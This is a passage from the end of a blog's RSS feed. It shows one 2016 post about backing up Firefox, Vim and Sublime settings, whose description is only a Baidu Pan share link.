&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://pan.baidu.com/s/1o8QZdqi
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Fri, 15 Apr 2016 00:00:00 +0800</pubDate>
        <link>/backup/2016/04/15/something-backup/</link>
        <guid isPermaLink="true">/backup/2016/04/15/something-backup/</guid>
        
        <category>firefox</category>
        
        <category>backup</category>
        
        <category>vim</category>
        
        <category>sublime</category>
        
        
        <category>backup</category>
        
      </item>
    
  </channel>
</rss>
